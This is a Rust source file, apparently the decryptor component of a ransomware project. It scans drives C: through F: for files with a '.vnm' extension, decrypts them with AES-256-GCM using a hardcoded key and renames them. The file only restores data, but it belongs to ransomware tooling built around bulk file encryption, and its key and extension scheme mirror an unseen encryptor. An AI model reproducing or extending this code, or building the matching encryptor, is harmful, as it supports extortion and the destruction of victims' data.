use std::path::{Path, PathBuf};
use std::env;
use std::fs;
use std::io::Write;
use std::time::Duration;
use std::thread::sleep;
use std::process::{Stdio, Command};
use std::io::{BufReader, BufRead};
use std::fs::OpenOptions;
use anyhow::{Result, Context};
use aes_gcm::{Aes256Gcm, Nonce, KeyInit, aead::{Aead, AeadCore, OsRng}};

mod core;

const KEY: &[u8; 32] = b"G7m9Xq2vR4pL8bF1sW0cZ6kD3jN5yH8u";

fn decrypt(path: &Path) -> Result<()> {

    let encrypted_content = fs::read(path).context("[!] Failed to read the content of the file !")?;
    let ciphertext  = &encrypted_content[12..];
    let nonce_bytes = &encrypted_content[..12];

    let cipher = Aes256Gcm::new_from_slice(KEY).unwrap();
    let nonce = Nonce::from_slice(&nonce_bytes); // 12-byte nonce

    // Decrypting the ciphertext
    let plaixntext = cipher.decrypt(&nonce, &*ciphertext)
        .context("[!] Decryption failed")?;
    

    // Open the file with write permissions
    let mut file = OpenOptions::new()
        .write(true)
        .truncate(true) // Truncate the file to 0 bytes
        .open(path)
        .context("Failed to open file")?;

    // Write the modification data to the file
    file.write_all(&plaixntext)
        .context("[!] Failed to write data to file")?;


    let file_name = path.file_name()
        .context("[!] Failed to get the file name!")?;
        
    let file_name_str = file_name.to_str()
        .context("[!] Filename is not valid Unicode")?;

    // Removing the .vnm extention
    let new_name = &file_name_str[..file_name_str.len() - 4];

    let new_path = path.with_file_name(new_name);
    fs::rename(path, &new_path)
        .context("[!] Failed to rename file with .vnm extension")?;


    Ok(())
}


// Antid0te decryptor main
fn main() -> Result<()> {

    // Generate a list of files for decryption
    let drvs = &["C:\\", "D:\\", "E:\\", "F:\\"];   
    for drv in drvs {
        let mut output = Command::new("cmd")
            .args(["/c", "dir", "/s", "/b", drv])
            .stdout(Stdio::piped())
            .spawn()?;

        let reader = BufReader::new(output.stdout.take().context("[!] Failed to capture stdio!")?);
        for line in reader.lines() {
            let path = PathBuf::from(line?);
            let result: Result<()> = (|| {

            // Check extentions
            if core::extention_filter(&[path.clone()], &["vnm"])?.is_empty() {
                return Ok(());
            }
            println!(" -> Decrypting: {}", path.display());
            decrypt(&path)?;

            Ok(())        
            })();
            // Silently continue if error
            if let Err(e) = result {
                println!("[!] Skipping {}: {}", path.display(), e);
            }
        }

        output.wait()?;
    }

    Ok(())
}
